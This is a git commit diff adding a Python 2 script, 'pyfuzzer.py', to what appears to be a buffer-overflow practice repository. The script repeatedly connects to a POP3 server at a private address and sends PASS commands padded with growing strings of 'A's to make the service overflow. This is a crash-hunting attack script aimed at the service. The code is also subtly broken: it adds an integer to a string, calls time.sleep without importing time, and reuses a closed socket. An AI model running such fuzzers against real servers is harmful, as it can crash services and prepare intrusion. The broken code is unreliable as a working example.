0da7a9a5095fed6cc715806901a2dedd024aec82
Justin Hende <39705148+BierBrigadier@users.noreply.github.com>
2020-09-03 13:29:21 +0200

    Update pyfuzzer.py

--- bof/pyfuzzer.py
+++ bof/pyfuzzer.py
@@ -1,1 +1,23 @@
-print("hi")
+import socket
+
+ip = '192.168.0.10'
+port = 110
+buffer = "A" * 100
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+ 
+while len(buffer) <= 4000:
+    try:
+        print "We are fuzzing with a length of %s bytes" % len(buffer)
+        s.connect((ip, port))
+        data = s.recv(1024)
+        # EDIT the commands here
+        s.send('USER ' + '\r\n')
+        data = s.recv(1024)
+        s.send('PASS ' + buffer + '\r\n')
+        data = s.recv(1024)
+        s.close()
+        print"\nDone!"
+        buffer += 100
+        time.sleep(0.3)
+    except:
+        print "Could not connect to POP3 for some reason..."
